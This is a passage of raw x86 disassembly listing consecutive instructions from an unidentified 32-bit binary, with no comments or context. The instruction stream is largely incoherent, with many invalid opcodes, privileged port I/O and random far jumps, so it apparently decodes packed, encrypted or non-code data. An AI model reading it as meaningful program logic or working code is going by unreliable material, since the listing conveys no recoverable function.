  40925a:	in     al,dx
  40925b:	sahf   
  40925c:	or     al,0x47
  40925e:	add    BYTE PTR [eax],al
  409260:	mov    bh,0x5d
  409262:	(bad)  
  409263:	pop    esp
  409264:	pushw  es
  409266:	lock and eax,esp
  409269:	sub    al,0x0
  40926b:	add    ah,dl
  40926d:	scas   eax,DWORD PTR es:[edi]
  40926e:	hlt    
  40926f:	sub    dh,BYTE PTR [edi-0xce89b24]
  409275:	stos   DWORD PTR es:[edi],eax
  409276:	pop    esp
  409277:	sub    dl,ch
  409279:	ror    DWORD PTR [esi],cl
  40927b:	scas   al,BYTE PTR es:[edi]
  40927c:	fistp  WORD PTR ds:0x969ae661
  409282:	repz sti 
  409284:	mov    eax,ds:0xe25efa32
  409289:	fs in  al,dx
  40928b:	gs leave 
  40928d:	(bad)  
  40928e:	(bad)  [edi]
  409290:	rcr    BYTE PTR [edx-0x42697ce3],cl
  409296:	inc    esp
  409297:	outs   dx,DWORD PTR ds:[esi]
  409298:	add    BYTE PTR [eax],al
  40929a:	pop    eax
  40929b:	mov    BYTE PTR [eax+eax*1+0x0],dl
  40929f:	or     BYTE PTR [edx],dl
  4092a1:	add    BYTE PTR [eax],al
  4092a3:	pop    edi
  4092a4:	cld    
  4092a5:	ja     0x4092dc
  4092a7:	jnp    0x409281
  4092a9:	icebp  
  4092aa:	dec    esi
  4092ab:	js     0x4092cd
  4092ad:	and    DWORD PTR [edi-0x8],0xb9cbdca3
  4092b4:	adc    DWORD PTR [eax],ebx
  4092b6:	scas   al,BYTE PTR es:[edi]
  4092b7:	sub    eax,DWORD PTR [ebx-0x3b]
  4092ba:	pop    ebx
  4092bb:	or     BYTE PTR [ebx],bl
  4092bd:	add    BYTE PTR [eax],al
  4092bf:	cmc    
  4092c0:	sbb    eax,0xf1a96c33
  4092c5:	aas    
  4092c6:	mov    ds:0x586bbb93,eax
  4092cb:	add    al,BYTE PTR [edi+ebx*4+0x0]
  4092cf:	add    BYTE PTR [esi+eax*2],bl
  4092d2:	in     eax,dx
  4092d3:	inc    esi
  4092d4:	(bad)  
  4092d5:	mov    WORD PTR [ebp-0x1d00000],?
  4092db:	rcl    bl,0x0
  4092de:	add    BYTE PTR [ebp-0x52],dl
  4092e1:	mov    gs,WORD PTR [ecx]
  4092e3:	mov    dl,dh
  4092e5:	xor    DWORD PTR [esi+esi*4-0x3],0x448c
  4092ed:	clc    
  4092ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092ef:	je     0x4092da
  4092f1:	adc    eax,0x3982d6d5
  4092f6:	mov    ebp,0x1a836514
  4092fb:	mov    edx,0x8a703dda
  409300:	arpl   WORD PTR [ebp+0x5ecc],ax
  409306:	fwait
  409307:	out    dx,eax
  409308:	ror    bh,1
  40930a:	in     al,0x20
  40930c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40930d:	int    0x23
  40930f:	ret    
  409310:	adc    WORD PTR [esi],di
  409313:	mov    edi,0xe86befe0
  409318:	sbb    DWORD PTR [esi+0x6e],esi
  40931b:	sahf   
  40931c:	mov    DWORD PTR [ecx],eax
  40931e:	cmp    al,al
  409320:	mov    ch,0x0
  409322:	add    BYTE PTR [eax-0xb],dl
  409325:	stos   BYTE PTR es:[edi],al
  409326:	repz adc al,0xaa
  409329:	pop    esp
  40932a:	cld    
  40932b:	or     DWORD PTR [ebp+edx*2-0x2e],esi
  40932f:	inc    ebx
  409330:	jl     0x4092cc
  409332:	hlt    
  409333:	mov    cl,0xc9
  409335:	aad    0xcc
  409337:	sti    
  409338:	add    BYTE PTR [eax],al
  40933a:	pop    ds
  40933b:	mov    cl,0x84
  40933d:	dec    ebp
  40933e:	add    BYTE PTR [eax],al
  409340:	adc    edx,ebp
  409342:	inc    edx
  409343:	sahf   
  409344:	mov    ecx,0x9ffbbc34
  409349:	cwde   
  40934a:	push   ss
  40934b:	stc    
  40934c:	outs   dx,DWORD PTR ds:[esi]
  40934d:	test   DWORD PTR [edi+0x55eaeef6],ecx
  409353:	fwait
  409354:	mov    bl,0x58
  409356:	jmp    0xb462:0xe19ba131
  40935d:	dec    edx
  40935e:	mov    BYTE PTR [ebx+0x0],cl
  409361:	add    dh,dh
  409363:	jae    0x409373
  409365:	mov    esp,esp
  409367:	aas    
  409368:	cmp    BYTE PTR [edi+ecx*4],al
  40936b:	add    BYTE PTR [eax],al
  40936d:	fs and eax,0xa67a7cf0
  409373:	imul   esi,DWORD PTR [edi-0x25],0xffffffa1
  409377:	cli    
  409378:	jnp    0x409362
  40937a:	mov    dh,0xd6
  40937c:	mov    ah,0xc9
  40937e:	push   ebx
  40937f:	mov    ebp,0xe0d96856
  409384:	and    DWORD PTR [eax+ebx*1+0x0],ecx
  409388:	add    BYTE PTR [ecx+0x62],al
  40938b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40938c:	fsub   st,st(7)
  40938e:	test   eax,0xdef615f1
  409393:	imul   edx,DWORD PTR ds:0xda159c6c,0xd42b7d22
  40939d:	iret   
  40939e:	cld    
  40939f:	rcr    dl,cl
  4093a1:	xor    eax,0xa24a6885
  4093a6:	xor    al,0x7e
  4093a8:	and    esi,DWORD PTR [esi+eiz*2]
  4093ab:	mov    edx,0xa3d82f89
  4093b0:	out    0x17,al
  4093b2:	cli    
  4093b3:	pusha  
  4093b4:	scas   al,BYTE PTR es:[edi]
  4093b5:	xchg   ebp,eax
  4093b6:	stos   DWORD PTR es:[edi],eax
  4093b7:	push   ss
  4093b8:	rcr    BYTE PTR ds:0x9ebc37a0,cl
  4093be:	retf   
  4093bf:	rcr    DWORD PTR [eax+0x4d],1
  4093c2:	jbe    0x409386
  4093c4:	std    
  4093c5:	inc    eax
  4093c6:	adc    eax,0xd62d0000
  4093cb:	popf   
  4093cc:	cmp    BYTE PTR [ebx],dh
  4093ce:	add    DWORD PTR [ebx-0x68],esp
  4093d1:	jmp    0xff27:0xa4e5f4aa
  4093d8:	push   cs
  4093d9:	mov    ecx,cs
  4093db:	add    BYTE PTR [eax],al
  4093dd:	pop    esp
  4093de:	mul    BYTE PTR [edi]
  4093e0:	sbb    al,bl
  4093e2:	jb     0x4093ca
  4093e4:	mov    ch,0x15
  4093e6:	sti    
  4093e7:	(bad)  
  4093e8:	in     eax,dx
  4093e9:	xlat   BYTE PTR ds:[ebx]
  4093ea:	sub    ecx,DWORD PTR [ecx+0x7e]
  4093ed:	dec    esi
  4093ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ef:	mov    ebx,0xad6627e1
  4093f4:	fs inc esi
  4093f6:	or     ah,BYTE PTR [esi+0x633b7fd1]
  4093fc:	arpl   WORD PTR [esp+ebp*1],di
  4093ff:	setbe  BYTE PTR [ebx]
  409402:	dec    edx
  409403:	inc    ecx
  409404:	jae    0x409418
  409406:	pop    ecx
  409407:	stos   BYTE PTR es:[edi],al
  409408:	int    0x8
  40940a:	pop    ebx
  40940b:	add    BYTE PTR [eax],al
  40940d:	mov    bh,0x61
  40940f:	mov    al,ds:0xb237a6d1
  409414:	push   ds
  409415:	adc    DWORD PTR [edx+0x32],ebp
  409418:	js     0x4093a6
  40941a:	das    
  40941b:	add    BYTE PTR [eax],al
  40941d:	aaa    
  40941e:	imul   ecx,DWORD PTR [ebx+0x16],0xffffffe5
  409422:	inc    eax
  409423:	add    eax,0xb8dc0000
  409428:	cli    
  409429:	xlat   BYTE PTR ds:[ebx]
  40942a:	cmp    DWORD PTR [edx+0x74d226b2],esp
  409430:	pop    ebp
  409431:	ret    0xaba
  409434:	push   eax
  409435:	add    DWORD PTR ss:[esi],esp
  409438:	sub    al,0xa0
  40943a:	cmc    
  40943b:	sub    eax,0x98d9a438
  409440:	or     ch,dh
  409442:	add    BYTE PTR [eax],al
  409444:	sbb    al,0xeb
  409446:	adc    al,0xaa
  409448:	clc    
  409449:	retf   
  40944a:	jne    0x40945a
  40944c:	arpl   bx,ax
  40944e:	sbb    DWORD PTR [ecx+0x62911b9e],esi
  409454:	or     al,0x4d
  409456:	add    BYTE PTR [eax],al
  409458:	jmp    0x409451
  40945a:	push   esp
  40945b:	mov    ebx,0x3cb2f6e4
  409460:	fnsave ds:0x9f724155
  409466:	sbb    esi,DWORD PTR [esp+eax*1-0x7cffffab]
  40946d:	mov    al,ds:0x984c6e
  409472:	add    BYTE PTR [edx],bh
  409474:	xor    al,0xfb
  409476:	shl    ah,0x0
  409479:	add    BYTE PTR [ebp+0x585262e7],cl
  40947f:	nop
  409480:	mov    esp,0xb9fcef6e
  409485:	xor    BYTE PTR fs:[ecx-0x2b],ch
  409489:	add    eax,0xe0931aed
  40948e:	idiv   DWORD PTR [eax+0x6d]
  409491:	in     al,dx
  409492:	fs inc ebp
  409494:	jns    0x409461
  409496:	gs int3 
  409498:	imul   eax,DWORD PTR [eax],0xdcada800
  40949e:	push   ebp
  40949f:	cmp    DWORD PTR [esi+esi*1+0x73a5a364],ebp
  4094a6:	sub    DWORD PTR [esi+0x3c7b529f],esp
  4094ac:	push   eax
  4094ad:	test   DWORD PTR [ecx+0x2f],0xd462ce65
  4094b4:	mov    ch,0x4c
  4094b6:	pop    DWORD PTR [eax]
  4094b8:	add    BYTE PTR [edi],dl
  4094ba:	sbb    DWORD PTR [ecx+eiz*1],esp
  4094bd:	loop   0x40944d
  4094bf:	test   BYTE PTR [eax],ch
  4094c1:	add    BYTE PTR [eax],al
  4094c3:	push   ds
  4094c4:	push   0x2a1855c3
  4094c9:	mov    BYTE PTR [ecx],ah
  4094cb:	add    BYTE PTR [eax],al
  4094cd:	and    al,0x54
  4094cf:	repz cwde 
  4094d1:	les    esi,FWORD PTR [ebx+0x0]
  4094d4:	add    BYTE PTR [esi],cl
  4094d6:	cmp    dl,BYTE PTR [eax-0x63df4b6a]
  4094dc:	(bad)  
  4094dd:	jmp    0x4094df
  4094df:	add    BYTE PTR [eax-0x5a2d8daf],bl
  4094e5:	test   eax,0xb09975f0
  4094ea:	pushf  
  4094eb:	cmp    BYTE PTR [edi+0x11],0x77
  4094ef:	sti    
  4094f0:	pop    ss
  4094f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094f2:	retf   
  4094f3:	(bad)  
  4094f4:	push   edi
  4094f5:	or     ah,ah
  4094f7:	sar    dl,0x0
  4094fa:	add    BYTE PTR [esi+0x7f],bl
  4094fd:	scas   eax,DWORD PTR es:[edi]
  4094fe:	sbb    BYTE PTR [edi-0x7e],cl
  409501:	xlat   BYTE PTR ds:[ebx]
  409502:	lock stc 
  409504:	xor    al,0x89
  409506:	pop    ss
  409507:	dec    eax
  409508:	data16 add BYTE PTR [eax],al
  40950b:	mov    al,ds:0x1500c3
  409510:	add    dl,dl
  409512:	fistp  QWORD PTR ss:[ecx+0x56d805d6]
  409519:	mov    dh,0xfd
  40951b:	(bad)  
  40951c:	out    0x98,al
  40951e:	xchg   DWORD PTR [edx-0x21],esi
  409521:	or     eax,0x52d5fba4
  409526:	out    dx,eax
  409527:	dec    esp
  409528:	fild   WORD PTR [eax]
  40952a:	add    BYTE PTR [esp+ecx*4+0x3cca0000],al
  409531:	into   
  409532:	and    eax,0x61ba2324
  409537:	pop    edx
  409538:	inc    ebx
  409539:	sbb    esi,esi
  40953b:	clc    
  40953c:	push   es
  40953d:	enter  0x99,0x0
  409541:	xor    BYTE PTR [eax+ebp*1],dl
  409544:	dec    edi
  409545:	mov    esi,0x528c66b0
  40954a:	add    BYTE PTR [eax],al
  40954c:	push   esi
  40954d:	stc    
  40954e:	pop    edi
  40954f:	push   ss
  409550:	adc    BYTE PTR [edi-0x5],ch
  409553:	repz inc ebp
  409555:	ins    DWORD PTR es:[edi],dx
  409556:	repnz inc esi
  409558:	aas    
  409559:	add    ebp,ebx
  40955b:	daa    
  40955c:	push   eax
  40955d:	mov    al,0xa
  40955f:	mov    dh,0x65
  409561:	add    al,BYTE PTR [eax+0x390000e1]
  409567:	xchg   esi,eax
  409568:	push   es
  409569:	mov    esp,DWORD PTR [eax]
  40956b:	dec    edi
  40956c:	xlat   BYTE PTR ds:[ebx]
  40956d:	test   al,0xef
  40956f:	rcr    bh,cl
  409571:	in     al,dx
  409572:	mov    edx,0xec15366a
  409577:	lds    eax,FWORD PTR [esi+0x20fd99cf]
  40957d:	call   0xd54:0x460e9dd3
  409584:	or     BYTE PTR [esi],bl
  409586:	add    BYTE PTR [eax],al
  409588:	or     al,0x9
  40958a:	add    BYTE PTR [eax],al
  40958c:	hlt    
  40958d:	scas   eax,DWORD PTR es:[edi]
  40958e:	ret    
  40958f:	scas   eax,DWORD PTR es:[edi]
  409590:	add    DWORD PTR [ebx],0x3b039b43
  409596:	pop    ebx
  409597:	inc    esi
  409598:	test   eax,0x29c6ab2e
  40959d:	mov    WORD PTR [edx],gs
  40959f:	add    BYTE PTR [eax],al
  4095a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a2:	in     eax,0xa8
  4095a4:	and    BYTE PTR [edx],bh
  4095a6:	pop    esp
  4095a7:	dec    edi
  4095a8:	xlat   BYTE PTR ds:[ebx]
  4095a9:	mov    esi,0xc816c763
  4095ae:	inc    edi
  4095af:	add    BYTE PTR [eax],al
  4095b1:	fwait
  4095b2:	add    al,BYTE PTR [esi-0x11]
  4095b5:	sub    al,0xdb
  4095b7:	add    BYTE PTR [esi+0x0],bh
  4095ba:	add    BYTE PTR [esi+edx*2],bl
  4095bd:	sar    BYTE PTR [eax-0x2d],cl
  4095c0:	cmp    DWORD PTR [edx],0xffffffba
  4095c3:	pop    es
  4095c4:	inc    edx
  4095c5:	(bad)  
  4095c6:	out    0x9b,eax
  4095c8:	shr    BYTE PTR [ebp+0xf],cl
  4095cb:	nop
  4095cc:	xchg   edx,eax
  4095cd:	inc    edi
  4095ce:	push   ds
  4095cf:	add    eax,0x13a3cca
  4095d4:	call   0x25ee36f7
  4095d9:	cdq    
  4095da:	jmp    0xfecf:0x4a3e5b89
  4095e1:	stc    
  4095e2:	in     al,0xda
  4095e4:	adc    al,0xd4
  4095e6:	adc    al,0xff
  4095e8:	ds mov ch,0x2a
  4095eb:	cmp    eax,0xcdfbdf7b
  4095f0:	and    edi,esi
  4095f2:	ss in  eax,dx
  4095f4:	xor    dl,BYTE PTR [eax-0x7f]
  4095f7:	push   edx
  4095f8:	dec    BYTE PTR [ecx+ebp*8+0x64100000]
  4095ff:	maxps  xmm1,xmm0
  409602:	mov    es,WORD PTR [eax]
  409604:	add    BYTE PTR [edi-0x5e],dl
  409607:	aad    0x56
  409609:	into   
  40960a:	sahf   
  40960b:	test   DWORD PTR [edi],0x268a6215
  409611:	hlt    
  409612:	out    0x36,eax
  409614:	add    eax,0xb51aa006
  409619:	outs   dx,DWORD PTR ds:[esi]
  40961a:	mov    bl,0x94
  40961c:	mov    esi,DWORD PTR ds:0x608c1b2f
  409622:	add    BYTE PTR [eax],al
  409624:	mov    ?,WORD PTR [eax-0x3]
  409627:	xor    ecx,DWORD PTR [ebx-0x5118747e]
  40962d:	outs   dx,BYTE PTR ds:[esi]
  40962e:	xor    edx,DWORD PTR [edi]
  409630:	xor    eax,0xeb5d2557
  409635:	adc    ecx,DWORD PTR [edx-0x5f]
  409638:	xchg   ebx,eax
  409639:	cs cmp al,0xdf
  40963c:	dec    esp
  40963d:	sbb    BYTE PTR [eax],al
  40963f:	add    ah,cl
  409641:	or     al,0x0
  409643:	add    BYTE PTR [esi-0x5b],ch
  409646:	and    eax,0x88ff3dd5
  40964b:	test   DWORD PTR [eax],eax
  40964d:	add    ah,cl
  40964f:	rol    BYTE PTR [eax],cl
  409651:	add    BYTE PTR [ebx],cl
  409653:	sti    
  409654:	pavgb  mm6,mm7
  409657:	test   DWORD PTR [eax],0xb100003c
  40965d:	mul    bh
  40965f:	push   esi
  409660:	stos   DWORD PTR es:[edi],eax
  409661:	das    
  409662:	ror    dh,1
  409664:	scas   eax,DWORD PTR es:[edi]
  409665:	repnz iret 
  409667:	out    dx,al
  409668:	mov    al,0xe4
  40966a:	mov    DWORD PTR ds:0x4c5899d,edx
  409670:	loope  0x409672
  409672:	add    BYTE PTR [ecx+0x9f8cb6],bl
  409678:	add    BYTE PTR [ebx-0x739ce3af],cl
  40967e:	xor    eax,0x53bf0000
  409683:	dec    esi
  409684:	jne    0x40968e
  409686:	mov    cl,0x0
  409688:	add    BYTE PTR [ebx+0x195136a3],cl
  40968e:	cmc    
  40968f:	sbb    cl,BYTE PTR [esi]
  409691:	fstp   DWORD PTR [ebp+0x4d]
  409694:	xor    al,0x2b
  409696:	mov    esp,0xd8a124d0
  40969b:	aaa    
  40969c:	mov    dh,0x64
  40969e:	cmp    bh,dl
  4096a0:	mov    eax,ds:0x9dcce8b
  4096a5:	jne    0x409700
  4096a7:	fcomip st,st(1)
  4096a9:	mov    ch,0x34
  4096ab:	jbe    0x4096cd
  4096ad:	data16 xor ch,BYTE PTR [esi-0x45]
  4096b1:	fdiv   QWORD PTR [eax]
  4096b3:	lea    ebx,[edi]
  4096b5:	push   0x58
  4096b7:	lock inc ecx
  4096b9:	adc    al,0xe
  4096bb:	std    
  4096bc:	or     eax,0xb2c4
  4096c1:	aam    0xe5
  4096c3:	sbb    eax,0x5d75a81c
  4096c8:	or     edx,DWORD PTR [ecx]
  4096ca:	pop    ecx
  4096cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096cc:	jbe    0x409741
  4096ce:	jp     0x40966f
  4096d0:	iret   
  4096d1:	mov    esi,DWORD PTR [ecx+0xe]
  4096d4:	loopne 0x40970b
  4096d6:	xchg   ch,bl
  4096d8:	mov    eax,ds:0x9a88e538
  4096dd:	add    BYTE PTR [eax],al
  4096df:	imul   eax,DWORD PTR [edi+0xf1008b],0x0
  4096e6:	les    edi,FWORD PTR [ebx+0x0]
  4096e9:	add    dh,al
  4096eb:	adc    DWORD PTR [ebp+0x13],esi
  4096ee:	jle    0x409705
  4096f0:	test   DWORD PTR [eax-0x75ffffe8],0xf61ebfd1
  4096fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096fb:	ds jae 0x4096b4
  4096fe:	pusha  
  4096ff:	popa   
  409700:	pop    es
  409701:	add    eax,0xaf3327ce
  409706:	shl    DWORD PTR [esi],1
  409708:	jo     0x40971f
  40970a:	and    ah,BYTE PTR [ecx]
  40970c:	cmp    bh,BYTE PTR [ebx]
  40970e:	push   eax
  40970f:	xchg   edx,eax
  409710:	inc    edi
  409711:	mov    bl,0xee
  409713:	mov    dh,0x12
  409715:	pop    es
  409716:	outs   dx,BYTE PTR ds:[esi]
  409717:	(bad)  
  409718:	jb     0x409758
  40971a:	shl    BYTE PTR [ebp-0x17],cl
  40971d:	repz or ah,BYTE PTR [edx-0x4e8bea7d]
  409724:	mov    ch,0xe0
  409726:	xor    eax,0x52c8c1
  40972b:	add    BYTE PTR [ebp-0x53],al
  40972e:	(bad)  
  40972f:	fiadd  DWORD PTR [esp+edx*2-0x4ece0000]
  409736:	mov    ebp,DWORD PTR [edx+0x7a224d56]
  40973c:	xchg   esp,eax
  40973d:	popf   
  40973e:	push   esi
  40973f:	push   eax
  409740:	adc    eax,0x8a21a817
  409745:	jne    0x40979c
  409747:	test   al,0x1
  409749:	mov    dl,0x8
  40974b:	call   0xf9969750
  409750:	sahf   
  409751:	xchg   esi,eax
  409752:	pusha  
  409753:	mov    gs,WORD PTR [edx-0x6ee3a509]
  409759:	retf   0x177b
  40975c:	xchg   ebx,eax
  40975d:	jle    0x409736
  40975f:	pop    ebp
  409760:	cli    
  409761:	stos   BYTE PTR es:[edi],al
  409762:	imul   ebx,DWORD PTR [edi],0xffffff80
  409765:	ret    0x0
  409768:	lods   eax,DWORD PTR ds:[esi]
  409769:	pop    ebp
  40976a:	inc    ebx
  40976b:	test   eax,0xb50164b6
  409770:	sub    eax,0x52f31863
  409775:	xor    eax,0xb929ac2c
  40977a:	arpl   si,dx
  40977c:	stos   DWORD PTR es:[edi],eax
  40977d:	and    DWORD PTR [ebp-0x15],edx
  409780:	or     ebx,DWORD PTR [eax]
  409782:	add    DWORD PTR [ebx-0x6aca9518],esi
  409788:	mov    bl,0x2f
  40978a:	sub    DWORD PTR [edi+0x6a],edx
  40978d:	shr    BYTE PTR ds:0x781ef664,1
  409793:	inc    esi
  409794:	push   ecx
  409795:	loop   0x4097c9
  409797:	dec    esp
  409798:	out    dx,al
  409799:	add    BYTE PTR [eax],al
  40979b:	cwde   
  40979c:	or     al,0xf6
  40979e:	add    BYTE PTR [eax],al
  4097a0:	stos   BYTE PTR es:[edi],al
  4097a1:	sub    BYTE PTR [esi],dl
  4097a3:	iret   
  4097a4:	rcl    DWORD PTR [esi+esi*8+0x62],cl
  4097a8:	adc    ebp,0xffffffb7
  4097ab:	in     al,0x46
  4097ad:	(bad)  
  4097ae:	loopne 0x4097b0
  4097b0:	add    dl,al
  4097b2:	jecxz  0x4097e2
  4097b4:	or     eax,0x8c3e7f3b
  4097b9:	data16 add BYTE PTR [eax],al
  4097bc:	or     BYTE PTR [eax+0x0],0x0
  4097c0:	mov    ecx,0x5100
  4097c5:	test   eax,0xbe879cd5
  4097ca:	out    dx,eax
  4097cb:	les    ebp,FWORD PTR [ebp+0x0]
  4097ce:	add    BYTE PTR [edi+eax*1-0x60e90000],al
  4097d5:	jo     0x40984d
  4097d7:	inc    eax
  4097d8:	pushf  
  4097d9:	add    BYTE PTR [eax],al
  4097db:	inc    esp
  4097dc:	fwait
  4097dd:	add    BYTE PTR [eax],al
  4097df:	mov    dh,0xf2
  4097e1:	shl    esp,1
  4097e3:	test   al,0x64
  4097e5:	or     edx,DWORD PTR [ebx]
  4097e7:	mov    ds:0xae820922,al
  4097ec:	add    DWORD PTR [esi+0x34b0a27e],ebp
  4097f2:	mov    dl,0xe6
  4097f4:	ficom  WORD PTR [ebx+0x2d95ce58]
  4097fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097fb:	adc    DWORD PTR [eax-0x7b89a5a5],edi
  409801:	mov    BYTE PTR [eax],al
  409803:	add    dl,ah
  409805:	test   DWORD PTR [eax+ebp*2-0x4d6e0000],0x748c
  409810:	(bad)  
  409811:	mov    eax,ds:0xe788b8
  409816:	add    cl,dh
  409818:	jns    0x40987f
  40981a:	xchg   edi,eax
  40981b:	jg     0x409832
  40981d:	or     al,0x26
  40981f:	add    BYTE PTR [eax],al
  409821:	int    0x50
  409823:	retf   0x91e4
  409826:	xchg   edx,eax
  409827:	stos   DWORD PTR es:[edi],eax
  409828:	sub    eax,0xcf80
  40982d:	push   ebx
  40982e:	mov    esp,0xc2c5f316
  409833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409834:	xlat   BYTE PTR ds:[ebx]
  409835:	sbb    edx,ecx
  409837:	mov    ecx,0x5aeaf84b
  40983c:	sbb    BYTE PTR [edi-0x7159218c],al
  409842:	rcl    bl,0x0
  409845:	add    BYTE PTR [edi+edx*4],ch
  409848:	aas    
  409849:	aam    0x12
  40984b:	inc    edx
  40984c:	pusha  
  40984d:	inc    ebp
  40984e:	cmc    
  40984f:	int    0xfc
  409851:	sbb    BYTE PTR [edi+0x765ed099],bh
  409857:	sub    eax,0x412bda54
  40985c:	xor    al,0x28
  40985e:	xchg   ebx,eax
  40985f:	nop
  409860:	(bad)  
  409861:	repz adc bl,BYTE PTR [ebx+0x67]
  409865:	and    eax,ebx
  409867:	push   ds
  409868:	add    DWORD PTR [eax],0x100007c
  40986e:	cmp    esp,DWORD PTR [eax+0x20]
  409871:	dec    ecx
  409872:	push   ebx
  409873:	test   DWORD PTR [ebp+0x5f],edi
  409876:	push   eax
  409877:	cdq    
  409878:	mov    dl,0x87
  40987a:	sub    eax,0xe998f0e6
  40987f:	fs sbb al,0x2c
  409882:	fiadd  DWORD PTR [esi-0x202deb81]
  409888:	dec    edx
  409889:	inc    ecx
  40988a:	retf   0x6ca3
  40988d:	xchg   DWORD PTR [ebx],ebp
  40988f:	cmp    ebp,DWORD PTR [edx-0x5ec1a816]
  409895:	push   esp
  409896:	shl    BYTE PTR [ebx-0x7a],1
  409899:	(bad)  [eax-0x7d]
  40989c:	add    BYTE PTR [eax],al
  40989e:	adc    BYTE PTR [ebp+0x1ef37952],al
  4098a4:	stos   DWORD PTR es:[edi],eax
  4098a5:	adc    al,BYTE PTR [eax]
  4098a7:	inc    BYTE PTR [eax]
  4098a9:	add    BYTE PTR [edi],al
  4098ab:	and    cl,dh
  4098ad:	into   
  4098ae:	push   0x33
  4098b0:	icebp  
  4098b1:	or     edx,DWORD PTR [edx+0x45a499b2]
  4098b7:	pop    ss
  4098b8:	arpl   si,dx
  4098ba:	je     0x409852
  4098bc:	push   edx
  4098bd:	arpl   cx,di
  4098bf:	cmp    BYTE PTR [ecx],dh
  4098c1:	dec    ebp
  4098c2:	push   es
  4098c3:	dec    ebx
  4098c4:	ds sbb dh,0x89
  4098c8:	inc    ebp
  4098c9:	inc    esp
  4098ca:	mov    al,ds:0x73ae0000
  4098cf:	add    ecx,edi
  4098d1:	aaa    
  4098d2:	out    0xe6,al
  4098d4:	sbb    BYTE PTR [ebp+0x4b],dl
  4098d7:	mov    al,0xcd
  4098d9:	int3   
  4098da:	jae    0x4098dc
  4098dc:	add    cl,dh
  4098de:	jae    0x4098d9
  4098e0:	xchg   ebx,esi
  4098e2:	lock pop ecx
  4098e4:	mov    edx,0xac407f
  4098e9:	add    BYTE PTR [eax+0x5755b15d],bl
  4098ef:	xchg   ebx,eax
  4098f0:	pop    edi
  4098f1:	jno    0x409956
  4098f3:	in     al,0x47
  4098f5:	in     al,0x3
  4098f7:	outs   dx,DWORD PTR ds:[esi]
  4098f8:	mov    bl,0x36
  4098fa:	lods   al,BYTE PTR ds:[esi]
  4098fb:	inc    esp
  4098fc:	outs   dx,BYTE PTR ds:[esi]
  4098fd:	add    BYTE PTR [eax],al
  4098ff:	je     0x40997d
  409901:	pop    ecx
  409902:	imul   esi,DWORD PTR [ecx+edi*4-0x5],0x86dd6665
  40990a:	mov    dl,0xb9
  40990c:	jne    0x409959
  40990e:	ret    0xae05
  409911:	or     BYTE PTR [eax+eax*1+0x0],dl
  409915:	enter  0x97,0x0
  409919:	in     al,0xc5
  40991b:	scas   eax,DWORD PTR es:[edi]
  40991c:	fst    QWORD PTR [eax]
  40991e:	or     eax,0x6c7493a7
  409923:	fsub   QWORD PTR [esi]
  409925:	pop    ecx
  409926:	outs   dx,DWORD PTR ds:[esi]
  409927:	clc    
  409928:	jge    0x40995b
  40992a:	shl    DWORD PTR [ebp-0x54da17e8],0x3b
  409931:	out    dx,eax
  409932:	daa    
  409933:	mov    cl,0x1a
  409935:	imul   edx,edx,0xffffff92
  409938:	scas   al,BYTE PTR es:[edi]
  409939:	inc    esi
  40993a:	xor    al,0x5e
  40993c:	cmp    edx,ebp
  40993e:	test   eax,0x52c82ea7
  409943:	add    BYTE PTR [eax],al
  409945:	pop    es
  409946:	adc    al,0x78
  409948:	loop   0x4098cd
  40994a:	shr    DWORD PTR [eax],cl
  40994c:	aaa    
  40994d:	mov    ah,0x3c
  40994f:	test   edi,ebp
  409951:	fs jb  0x4099a0
  409954:	into   
  409955:	add    BYTE PTR [eax],al
  409957:	push   ebx
  409958:	sub    DWORD PTR [esi],ebp
  40995a:	push   0x7e
  40995c:	in     al,0xa2
  40995e:	xor    eax,0xa52ba938
  409963:	or     DWORD PTR [edi],edi
  409965:	sub    esp,DWORD PTR [esi+0x25]
  409968:	outs   dx,DWORD PTR ds:[esi]
  409969:	mov    ebx,0xb52b3809
  40996e:	ins    DWORD PTR es:[edi],dx
  40996f:	cmp    al,BYTE PTR [ebx+0x7db556c2]
  409975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409976:	nop
  409977:	lock loope 0x409954
  40997a:	add    eax,0x3b57a7ab
  40997f:	in     al,0xc7
  409981:	mov    esi,0xe608
  409986:	sbb    eax,0xcfe74a96
  40998b:	mov    al,ds:0xd5500ed1
  409990:	adc    BYTE PTR ds:0xb8f28a70,bh
  409996:	mov    al,ds:0xc8c6d534
  40999b:	js     0x40999d
  40999d:	add    dl,dl
  40999f:	push   es
  4099a0:	xchg   edx,ecx
  4099a2:	pop    esi
  4099a3:	daa    
  4099a4:	ffree  st(3)
  4099a6:	mov    al,ds:0x2ab64b09
  4099ab:	das    
  4099ac:	xor    bh,ah
  4099ae:	repz mov bl,0x3c
  4099b1:	in     al,0xc6
  4099b3:	out    dx,al
  4099b4:	scas   eax,DWORD PTR es:[edi]
  4099b5:	cld    
  4099b6:	rcl    esi,1
  4099b8:	sahf   
  4099b9:	test   al,0xc2
  4099bb:	hlt    
  4099bc:	inc    ebp
  4099bd:	adc    cl,cl
  4099bf:	pop    ecx
  4099c0:	adc    BYTE PTR [ebp+0x637866f5],0xb9
  4099c7:	cmp    BYTE PTR [ebp+0x26104901],bl
  4099cd:	xchg   DWORD PTR [ebp+eax*2+0xf],edi
  4099d1:	clc    
  4099d2:	mov    ch,0x2d
  4099d4:	fstp   TBYTE PTR [eax+edx*4]
  4099d7:	jle    0x409a05
  4099d9:	aas    
  4099da:	or     eax,0x3f7edeeb
  4099df:	add    ch,cl
  4099e1:	add    BYTE PTR [eax],al
  4099e3:	pop    ebx
  4099e4:	int    0xba
  4099e6:	les    edi,FWORD PTR [ebx-0x6e310000]
  4099ec:	jb     0x40997d
  4099ee:	mov    fs,edi
  4099f0:	dec    ecx
  4099f1:	popa   
  4099f2:	aad    0x12
  4099f4:	sbb    al,BYTE PTR [eax]
  4099f6:	test   BYTE PTR [eax],0x0
  4099f9:	pop    esi
  4099fa:	rcl    al,0x0
  4099fd:	add    ah,bh
  4099ff:	in     eax,0xc8
  409a01:	outs   dx,DWORD PTR ds:[esi]
